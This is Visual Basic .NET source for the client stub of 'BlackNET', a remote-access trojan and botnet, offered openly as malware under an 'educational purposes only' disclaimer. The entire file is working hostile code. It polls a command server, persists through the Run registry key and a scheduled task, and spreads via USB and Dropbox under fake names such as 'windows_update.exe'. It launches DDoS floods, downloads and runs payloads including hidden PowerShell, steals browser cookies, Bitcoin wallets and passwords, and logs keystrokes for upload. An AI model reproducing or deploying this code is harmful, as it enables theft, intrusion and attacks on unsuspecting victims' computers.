Imports System.Threading
Imports System.Net
Imports System.Text
Imports System.IO
Imports System.Security.Cryptography
Imports System.Management
Imports System.Reflection
Imports System.Security.Principal

' -------------------------------
' BlackNET Stub
' Socket By: Black.Hacker
' ByPassSCP By: Black.Hacker
' Watchdog By: Black.Hacker
' UDP Modified By: Black.Hacker
' Cookies Stealers By: Black.Hacker
' PasswordPlugin Modified By: Black.Hacker
' RemoteDesktop By: Black.Hacker
' 
' Thx to : Nyan Cat, KFC, Underc0de
' Copyright (c) DarkSoftwareCo & Black.Hackr
'
' This Project is for educational purposes only.
' 
' This Project is Licensed under MIT
' -------------------------------

Public Class Form1
    Public Host As String = "[HOST]"
    Public ID As String = "[ID]"
    Public Startup As String = "[Startup]"
    Public HardInstall As String = "[HardInstall]"
    Public StartName As String = "[StartupName]"
    Public BypassScanning As String = "[BypassSCP]"
    Public USBSpread As String = "[USBSpread]"
    Public AntiVM As String = "[AntiVM]"
    Public RSAKey As String = "[RSAKey]"
    Public RSAStatus As String = "[RSAStatus]"
    Public InstallName As String = "[Install_Name]"
    Public PathS As String = "[Install_Path]"
    Public ASchtask As String = "[Added_SchTask]"
    Public WatcherStatus As String = "[Watcher_Status]"
    Public WatcherBytes As String = "[Watcher_Bytes]"
    Public DropBoxSpreadd As String = "[DropBox_Spread]"
    Public BinderStatus As String = "[BinderStatus]"
    Public BinderBytes As String = "[BinderBytes]"
    Public DropperPath As String = "[DropperPath]"
    Public BinderSleep As String = "[BinderSleep]"
    Public DropperName As String = "[DropperName]"
    Public st As Integer = 0
    Public Y As String = "|BN|"
    Public trd As Thread
    Public LO As Object = New FileInfo(Application.ExecutablePath)
    Public MTX As String = "[MUTEX]"
    Public MT As Mutex = Nothing
    Public s As String = New FileInfo(Application.ExecutablePath).Name
    Public TempPath As String = Path.GetTempPath
    Public LogsPath As String = TempPath & "\" & s & ".txt"
    Public C As HTTP = New HTTP
    Private Sub Form1_FormClosed(sender As Object, e As FormClosedEventArgs) Handles Me.FormClosed
        C.Send("Offline")
        Application.Exit()
    End Sub
    Private Sub Form1_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        C.Send("Offline")
        Application.Exit()
    End Sub
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Try
            If File.Exists(TempPath & "\updatedpayload.exe") Then
                If (Application.ExecutablePath = TempPath & "\updatedpayload.exe") Then
                    Return
                Else
                    Process.Start(TempPath & "\updatedpayload.exe")
                    Application.Exit()
                End If
            End If

            If Application.ExecutablePath.EndsWith("windows_update.exe") Then
                IO.File.WriteAllText(TempPath & "\BlackNET.dat", "True")
            End If

            If My.Settings.moveStatus = True Then
                C.Host = My.Settings.newHost
            Else
                If RSAStatus = "True" Then
                    C.Host = RSA_Decrypt(Host, RSAKey)
                Else
                    C.Host = Host
                End If
            End If

            C.ID = ID & "_" & HWD()
            C.Connect()
            C.Send("Online")



            If checkBlacklist() = True Then
                C.Send("Uninstall")
                DStartup(StartName)
                Application.Exit()
            End If

            If BinderStatus = "True" Then
                Dim Binder As New Binder
                Binder.BinderBytes = BinderBytes
                Binder.DropperName = DropperName
                Binder.DropperPath = DropperPath
                Binder.BinderSleep = BinderSleep
                Binder.StartBinder()
            End If

            If Startup = "True" Then
                trd = New Thread(Sub() StartWork(True))
                trd.IsBackground = True
                trd.Start()
            End If

            If BypassScanning = "True" Then
                Dim bypass As New Screening_Programs
                bypass.Start()
            End If

            If AntiVM = "True" Then
                Dim AntiVirtual As New AntiVM
                AntiVirtual.ST(Application.ExecutablePath)
            End If

            If USBSpread = "True" Then
                Dim USB As New USBSpread
                USB.ExeName = "windows_update.exe"
                USB.Start()
            End If

            If DropBoxSpreadd = "True" Then
                DropBoxSpread()
            End If

            If HardInstall = "True" Then
                Call Install_Server()
                If Application.ExecutablePath = Environ(PathS) & "\Microsoft\MyClient\" & InstallName Then
                    C.Send("Online")
                Else
                    Process.Start(Environ(PathS) & "\Microsoft\MyClient\" & InstallName)
                    Application.Exit()
                    Try
                        File.SetAttributes(Application.ExecutablePath, FileAttributes.Hidden + FileAttributes.System)
                    Catch ex As Exception

                    End Try
                    End
                End If
            End If

            If ASchtask = "True" Then
                SchTask()
            End If

            If WatcherStatus = "True" Then
                If HardInstall = "True" Then : Watchdog.HardInstallStatus = True : Else : Watchdog.HardInstallStatus = False : End If
                Watchdog.NewWatchdog(WatcherBytes)
            End If

            st = 0
            Dim t As New Thread(Sub() IND(True))
            t.IsBackground = True
            t.Start()

            Try
                For Each x In Process.GetProcesses
                    Try
                        If CompDir(New FileInfo(x.MainModule.FileName), LO) Then
                            If x.Id > Process.GetCurrentProcess.Id Then
                                End
                            End If
                        End If
                    Catch ex As Exception
                    End Try
                Next
            Catch ex As Exception
            End Try
            Try
                Mutex.OpenExisting(MTX)
                End
            Catch ex As Exception
            End Try
            Try
                MT = New Mutex(True, MTX)
            Catch ex As Exception
                End
            End Try
        Catch ex As Exception

        End Try
    End Sub
    Public Sub Install_Server()
        Try
            Dim DropPath As String = Environ(PathS) & "\Microsoft\MyClient\"
            If Not (Directory.Exists(DropPath)) Then
                Directory.CreateDirectory(DropPath)
            End If
            If File.Exists(DropPath & InstallName) Then
                File.Delete(DropPath & InstallName)
            End If
            Melt(DropPath & InstallName)
        Catch ex As Exception

        End Try
    End Sub
    Public Sub Melt(filename As String)
        Try
            File.Copy(Application.ExecutablePath, filename, True)
            File.SetAttributes(filename, FileAttributes.System + FileAttributes.Hidden)
            AStartup(StartName, filename)
        Catch ex As Exception

        End Try
    End Sub
    Public Function RSA_Decrypt(ByVal Input As String, ByVal Key As String) As String
        Dim plain As Byte()
        Using rsa As RSACryptoServiceProvider = New RSACryptoServiceProvider(2048)
            rsa.PersistKeyInCsp = False
            rsa.FromXmlString(Key)
            Dim buffer As Byte() = Convert.FromBase64String(Input)
            plain = rsa.Decrypt(buffer, True)
        End Using
        Return System.Text.Encoding.UTF8.GetString(plain)
    End Function

    Public Function checkBlacklist() As Boolean
        Return My.Settings.blacklist
    End Function

    Public Sub IND(ByVal x As Boolean)
        Try
            Do While x = True
                Dim CurrentHost As String
                Dim GetCommands As New WebClient
                If RSAStatus = "True" Then : CurrentHost = RSA_Decrypt(Host, RSAKey) : Else : CurrentHost = Host : End If
                Dim Command As String = GetCommands.DownloadString(CurrentHost & "/getCommand.php?id=" & ID & "_" & HWD())
                Dim A As String() = Split(C.DEB(Command), Y)
                Select Case A(0)
                    Case "Ping"
                        C.Send("Online")

                    Case "StartDDOS"
                        Select Case A(1)
                            Case "UDPAttack"
                                UDP.Host = A(2)
                                UDP.Threadsto = 3
                                UDP.Time = 300
                                UDP.DOSData = Randomisi(300)
                                UDP.Start()
                                C.Send("CleanCommands")

                            Case "SlowlorisAttack"
                                Slowloris.StartSlowloris(A(2), 3, 300, Randomisi(300))
                                C.Send("CleanCommands")

                            Case "ARMEAttack"
                                ARME.StartARME(A(2), 3, 300, Randomisi(300))
                                C.Send("CleanCommands")

                            Case "TCPAttack"
                                Condis.StartCondis(A(2), 3, 300, 80)
                                C.Send("CleanCommands")

                            Case "HTTPGetAttack"
                                HTTPGet.StartHTTPGet(A(2), 3, 300)
                                C.Send("CleanCommands")

                            Case "BWFloodAttack"
                                BandwidthFlood.StartBandwidthFlood(A(2), 3, 300)
                                C.Send("CleanCommands")

                            Case "PostHTTPAttack"
                                PostHTTP.StartPOSTHTTP(A(2), 3, 300, Randomisi(300))
                                C.Send("CleanCommands")
                        End Select

                    Case "StopDOOS"
                        Select Case A(1)
                            Case "UDPAttack"
                                UDP.Abort()
                                C.Send("CleanCommands")

                            Case "SlowlorisAttack"
                                Slowloris.StopSlowloris()
                                C.Send("CleanCommands")

                            Case "ARMEAttack"
                                ARME.StopARME()
                                C.Send("CleanCommands")

                            Case "TCPAttack"
                                Condis.StopCondis()
                                C.Send("CleanCommands")

                            Case "HTTPGetAttack"
                                HTTPGet.StopHTTPGET()
                                C.Send("CleanCommands")

                            Case "BWFloodAttack"
                                BandwidthFlood.StopBandwidthFlood()
                                C.Send("CleanCommands")

                            Case "PostHTTPAttack"
                                PostHTTP.StopPOSTHTTP()
                                C.Send("CleanCommands")
                        End Select

                    Case "UploadFile"
                        Dim DownloadFile As New WebClient
                        Dim File() As Byte = DownloadFile.DownloadData(A(1))
                        IO.File.WriteAllBytes(Environ("Temp") & "\" & A(2), File)
                        Process.Start(Environ("Temp") & "\" & A(2))
                        C.Send("CleanCommands")

                    Case "OpenPage"
                        Process.Start(A(1))
                        C.Send("CleanCommands")

                    Case "OpenHidden"
                        Dim WebThread As New Thread(Sub() OpenWebHidden(A(1)))
                        WebThread.IsBackground = True
                        WebThread.Start()
                        C.Send("CleanCommands")

                    Case "Uninstall"
                        C.Send("Uninstall")
                        DStartup(StartName)
                        Watchdog.StopWatcher(True)
                        SelfDestroy()
                        Me.Close()
                        Application.Exit()

                    Case "ExecuteScript"
                        Try
                            Dim ExecuteScript As New WebClient
                            ExecuteScript.DownloadFile(CurrentHost & "/scripts/" & A(2), TempPath & "\" & A(2))
                            Select Case A(1)
                                Case "bat"
                                    Process.Start(TempPath & "\" & A(2))
                                Case "vbs"
                                    Process.Start(TempPath & "\" & A(2))
                                Case "ps1"
                                    PowerShell(TempPath & "\" & A(2))
                            End Select
                            C.Send("DeleteScript" & "|BN|" & A(2))
                            C.Send("CleanCommands")
                        Catch ex As Exception
                            C.Send("CleanCommands")
                        End Try


                    Case "Close"
                        C.Send("CleanCommands")
                        C.Send("Offline")
                        Watchdog.StopWatcher(False)
                        Application.Exit()

                    Case "ShowMessageBox"
                        Dim msgIcon As MessageBoxIcon
                        Dim msgButton As MessageBoxButtons

                        Select Case A(3)
                            Case "None"
                                msgIcon = MessageBoxIcon.None
                            Case "Information"
                                msgIcon = MessageBoxIcon.Information
                            Case "Asterisk"
                                msgIcon = MessageBoxIcon.Asterisk
                            Case "Critical"
                                msgIcon = MessageBoxIcon.Error
                            Case "Warning"
                                msgIcon = MessageBoxIcon.Warning
                            Case "Question"
                                msgIcon = MessageBoxIcon.Question
                        End Select

                        Select Case A(4)
                            Case "OkOnly"
                                msgButton = MessageBoxButtons.OK
                            Case "OkCancel"
                                msgButton = MessageBoxButtons.OKCancel
                            Case "YesNo"
                                msgButton = MessageBoxButtons.YesNo
                            Case "YesNoCancel"
                                msgButton = MessageBoxButtons.YesNoCancel
                            Case "AbortRetryIgnore"
                                msgButton = MessageBoxButtons.AbortRetryIgnore
                            Case "RetryCancel"
                                msgButton = MessageBoxButtons.RetryCancel
                        End Select

                        MessageBox.Show(A(1), A(2), msgButton, msgIcon)
                        C.Send("CleanCommands")

                    Case "MoveClient"
                        My.Settings.moveStatus = True
                        My.Settings.newHost = A(1)
                        My.Settings.Save()
                        C.Send("Uninstall")
                        Application.Restart()

                    Case "Blacklist"
                        My.Settings.blacklist = True
                        My.Settings.Save()
                        C.Send("Uninstall")
                        Application.Exit()

                    Case "Screenshot"
                        Dim Screenshot As New RemoteDesktop
                        Screenshot.Host = CurrentHost
                        Screenshot.ID = C.ENB(ID + "_" + HWD())
                        Screenshot.Start()
                        C.Send("CleanCommands")

                    Case "StealCookie"
                        StealFFCookies()
                        C.Upload(TempPath & "cookies.sqlite")
                        C.Send("CleanCommands")

                    Case "StealChCookies"
                        StealChromeCookies()
                        C.Send("CleanCommands")

                    Case "InstalledSoftwares"
                        ProgramList()
                        C.Upload(TempPath & "\\ProgramList.txt")
                        C.Send("CleanCommands")

                    Case "StealBitcoin"
                        If (File.Exists(Environ("%appdata%" & "\" & "Bitcoin\wallet.dat"))) Then
                            C.Upload(Environ("%appdata%" & "\" & "Bitcoin\wallet.dat"))
                            C.Send("CleanCommands")
                        Else
                            C.Send("CleanCommands")
                            Return
                        End If

                    Case "StartKeylogger"
                        Dim tt As Thread = New Thread(AddressOf LimeLogger.Start, 1)
                        tt.IsBackground = True
                        tt.Start()
                        C.Send("CleanCommands")

                    Case "RetriveLogs"
                        C.Upload(LogsPath)
                        C.Send("CleanCommands")

                    Case "StealPassword"
                        StealPasswords("PasswordStealer", CurrentHost)
                        C.Send("CleanCommands")

                    Case "UpdateClient"
                        UpdateClient(A(1))
                        C.Send("CleanCommands")

                    Case "Restart"
                        C.Send("CleanCommands")
                        Application.Restart()

                    Case "Elevate"
                        RestartElevated()
                        C.Send("CleanCommands")

                    Case "Logoff"
                        C.Send("CleanCommands")
                        Shell("shutdown -l -t 00", AppWinStyle.Hide)

                    Case "Restart"
                        C.Send("CleanCommands")
                        Shell("shutdown -r -t 00", AppWinStyle.Hide)

                    Case "Shutdown"
                        C.Send("CleanCommands")
                        Shell("shutdown -s -t 00", AppWinStyle.Hide)
                End Select
            Loop
        Catch ex As Exception

        End Try
    End Sub
    Public Function PowerShell(ByVal TempName As String)
        Try
            Dim si As New ProcessStartInfo
            With si
                .FileName = "powershell"
                .Arguments = "–ExecutionPolicy Bypass -WindowStyle Hidden -NoExit -File " + """" + TempName + """"
                .CreateNoWindow = True
                .WindowStyle = ProcessWindowStyle.Hidden
            End With
            Process.Start(si)
            Return True
        Catch ex As System.ComponentModel.Win32Exception
            Return False
        End Try
    End Function
    Public Function checkUSB()
        If File.Exists(TempPath & "\BlackNET.dat") Then
            Return "yes"
        Else
            Return "no"
        End If
    End Function
    Public Function StealFFCookies()
        Try
            Dim directories As String() = Directory.GetDirectories("C:\Users\" + Environment.UserName + "\AppData\Roaming\Mozilla\Firefox\Profiles")
            Dim i As Integer = 0
            While i < directories.Length
                Dim text2 As String = directories(i)
                Dim flag As Boolean = File.Exists("C:\Users\" + Environment.UserName + "\AppData\Roaming\Mozilla\Firefox\Profiles" + text2.Replace("C:\Users\" + Environment.UserName + "\AppData\Roaming\Mozilla\Firefox\Profiles", String.Empty) + "\cookies.sqlite")
                If flag Then
                    Dim name As String = text2.Replace("C:\Users\" + Environment.UserName + "\AppData\Roaming\Mozilla\Firefox\Profiles", String.Empty)
                    File.Copy("C:\Users\" + Environment.UserName + "\AppData\Roaming\Mozilla\Firefox\Profiles\" + name + "\cookies.sqlite", TempPath & "\" & "cookies.sqlite", True)
                End If
                i = i + 1
            End While
            Return True
        Catch ex As Exception
            Return False
        End Try
    End Function
    Public Function StealChromeCookies()
        Try
            Dim chromeData As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) & "\Google\Chrome\User Data\Default\"
            If File.Exists(chromeData & "Cookies") Then
                File.Copy(chromeData & "Cookies", TempPath & "\" & "CookiesCh.sqlite")
                C.Upload(TempPath & "\" & "CookiesCh.sqlite")
            End If
            Return True
        Catch ex As Exception
            Return False
        End Try
    End Function
    Public Function DropBoxSpread()
        Try
            If Not File.Exists(GetDropbox() & "\" & "Adobe Photoshop CS.exe") Then
                File.Copy(Application.ExecutablePath, GetDropbox() & "\" & "Adobe Photoshop CS.exe", True)
            End If
            Return True
        Catch ex As Exception
            Return False
        End Try
    End Function
    Public Function GetLocation() As String
        Dim res As String = Assembly.GetExecutingAssembly().Location
        If res = "" OrElse res Is Nothing Then
            res = Assembly.GetEntryAssembly().Location
        End If
        Return res
    End Function
    Public Function GetDropbox()
        Dim DropboxFolder = Environment.GetEnvironmentVariable("USERPROFILE") & "\Dropbox"
        If Not (Directory.Exists(DropboxFolder)) Then
            Return "None"
        Else
            Return DropboxFolder
        End If
    End Function
    Public Sub SelfDestroy()
        Dim si As ProcessStartInfo = New ProcessStartInfo()
        With si
            .FileName = "cmd.exe"
            .Arguments = "/C ping 1.1.1.1 -n 1 -w 4000 > Nul & Del """ & GetLocation() & """"
            .CreateNoWindow = True
            .WindowStyle = ProcessWindowStyle.Hidden
        End With
        Process.Start(si)
    End Sub
    Public Function UpdateClient(ByVal URL As String)
        Try
            Dim Download As New WebClient
            Download.DownloadFile(URL, TempPath & "\updatedpayload.exe")
            File.SetAttributes(TempPath & "\updatedpayload.exe", FileAttributes.Hidden + FileAttributes.System)
            C.Send("Uninstall")
            AStartup(getMD5Hash(File.ReadAllBytes(TempPath & "\updatedpayload.exe")), TempPath & "\updatedpayload.exe")
            Process.Start(TempPath & "\updatedpayload.exe")
            SelfDestroy()
            Application.Exit()
            Return True
        Catch ex As Exception
            Return ex.Message
        End Try
    End Function
    Public Shared Function getMD5Hash(ByVal B As Byte()) As String
        B = New MD5CryptoServiceProvider().ComputeHash(B)
        Dim str2 As String = ""
        Dim num As Byte
        For Each num In B
            str2 = (str2 & num.ToString("x2"))
        Next
        Return str2
    End Function
    Public Sub OpenWebHidden(Url As String)
        Dim openpage As New WebBrowser
        openpage.ScriptErrorsSuppressed = True
        openpage.Navigate(Url)
        Application.Run()
    End Sub
    Public Function checkadmin() As String
        Dim W_Id = WindowsIdentity.GetCurrent()
        Dim WP = New WindowsPrincipal(W_Id)
        Dim isAdmin As Boolean = WP.IsInRole(WindowsBuiltInRole.Administrator)
        If isAdmin = True Then
            Return "Administrator"
        Else
            Return "User"
        End If
    End Function
    Public Function StealPasswords(ByVal PluginName As String, ByVal CurrentHost As String)
        Try
            Dim Plugin As New WebClient
            Dim PluginData As Byte() = Plugin.DownloadData(CurrentHost & "/plugins/" & PluginName & ".dll")
            Dim p = Reflection.Assembly.Load(PluginData)
            Dim getPassword = p.CreateInstance(C.DEB("UGFzc3dvcmRTdGVhbGVyLlN0ZWVsUGFzc3dvcmQ="))
            getPassword.Dump()
            C.Upload(TempPath & "/Passwords.txt")
            IO.File.Delete(TempPath & "/Passwords.txt")
            Return True
        Catch ex As Exception
            Return ex.Message
        End Try
    End Function
    Function SchTask()
        Try
            Dim installfullpath As FileInfo
            If HardInstall = "True" Then
                installfullpath = New FileInfo(Path.Combine(Environ(PathS), InstallName))
            Else
                installfullpath = New FileInfo(Application.ExecutablePath)
            End If
            Dim pi As New ProcessStartInfo
            With pi
                .FileName = "schtasks.exe"
                .Arguments = "/create /f /sc ONSTART /RL HIGHEST /tn " + """'" + Path.GetFileNameWithoutExtension(installfullpath.FullName) + """'" + " /tr " + """'" + installfullpath.FullName + """'"
                .WindowStyle = ProcessWindowStyle.Hidden
                .CreateNoWindow = True
            End With
            Process.Start(pi)
            Return True
        Catch ex As Exception
            Return False
        End Try
    End Function
    Function GetAntiVirus() As String
        Try
            Dim str As String = Nothing
            Dim searcher As New ManagementObjectSearcher("\\" & Environment.MachineName & "\root\SecurityCenter2", "SELECT * FROM AntivirusProduct")
            Dim instances As ManagementObjectCollection = searcher.[Get]()
            For Each queryObj As ManagementObject In instances
                str = queryObj("displayName").ToString()
            Next
            If str = String.Empty Then str = "N/A"
            str.ToString()
            Return str
            searcher.Dispose()
        Catch
            Return "N/A"
        End Try
    End Function
    Private Sub RestartElevated()
        Dim startInfo As New ProcessStartInfo()
        With startInfo
            .UseShellExecute = True
            .WorkingDirectory = Environment.CurrentDirectory
            .FileName = Application.ExecutablePath
            .Verb = "runas"
        End With
        Try
            C.Send("CleanCommands")
            Dim p As Process = Process.Start(startInfo)
            End
        Catch ex As System.ComponentModel.Win32Exception
            C.Send("CleanCommands")
            Return
        End Try
    End Sub
    Public Function ProgramList()
        On Error Resume Next
        Dim TextBox2 As New TextBox
        Dim folderPath As String = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles)
        For Each text As String In Directory.GetDirectories(folderPath)
            Dim text2 As String = text.Substring(text.LastIndexOf("\")).Replace("\", String.Empty) & vbCrLf
            TextBox2.AppendText(text2)
            File.WriteAllText(TempPath + "\\ProgramList.txt", TextBox2.Text)
        Next
    End Function
    Public Function Randomisi(ByVal lenght As Integer) As String
        Randomize()
        Dim b() As Char
        Dim s As New System.Text.StringBuilder("")
        b = "•¥µ☺☻♥♦♣♠•◘○◙♀♪♫☼►◄↕‼¶§▬↨↑↓→←∟↔▲▼1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzابتثجحخدذرزسشصضطظعغفقكلمنهوي~!@#$%^&*()+-/><".ToCharArray()
        For i As Integer = 1 To lenght
            Randomize()
            Dim z As Integer = Int(((b.Length - 2) - 0 + 1) * Rnd()) + 1
            s.Append(b(z))
        Next
        Return s.ToString
    End Function
    Private Declare Function GetVolumeInformation Lib "kernel32" Alias "GetVolumeInformationA" (ByVal lpRootPathName As String, ByVal lpVolumeNameBuffer As String, ByVal nVolumeNameSize As Integer, ByRef lpVolumeSerialNumber As Integer, ByRef lpMaximumComponentLength As Integer, ByRef lpFileSystemFlags As Integer, ByVal lpFileSystemNameBuffer As String, ByVal nFileSystemNameSize As Integer) As Integer
    Function HWD() As String
        Try
            Dim sn As Integer
            GetVolumeInformation(Environ("SystemDrive") & "\", Nothing, Nothing, sn, 0, 0, Nothing, Nothing)
            Return (Hex(sn))
        Catch ex As Exception
            Return "ERR"
        End Try
    End Function
    Private Function CompDir(ByVal F1 As IO.FileInfo, ByVal F2 As IO.FileInfo) As Boolean ' Compare 2 path
        If F1.Name.ToLower <> F2.Name.ToLower Then Return False
        Dim D1 = F1.Directory
        Dim D2 = F2.Directory
re:
        If D1.Name.ToLower = D2.Name.ToLower = False Then Return False
        D1 = D1.Parent
        D2 = D2.Parent
        If D1 Is Nothing And D2 Is Nothing Then Return True
        If D1 Is Nothing Then Return False
        If D2 Is Nothing Then Return False
        GoTo re
    End Function
    Public Sub StartWork(ByVal x As Boolean)
        Do While x = True
            Thread.Sleep(5000)
            AStartup(StartName, Application.ExecutablePath)
        Loop
    End Sub
End Class
Module Extra
    Public Sub AStartup(ByVal Name As String, ByVal Path As String)
        On Error Resume Next
        Dim Registry As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser
        Dim Key As Microsoft.Win32.RegistryKey = Registry.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True)
        Key.SetValue(Name, Path, Microsoft.Win32.RegistryValueKind.String)
    End Sub
    Public Sub DStartup(ByVal Name As String)
        On Error Resume Next
        Dim Registry As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser
        Dim Key As Microsoft.Win32.RegistryKey = Registry.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True)
        Key.DeleteValue(Name)
    End Sub
End Module
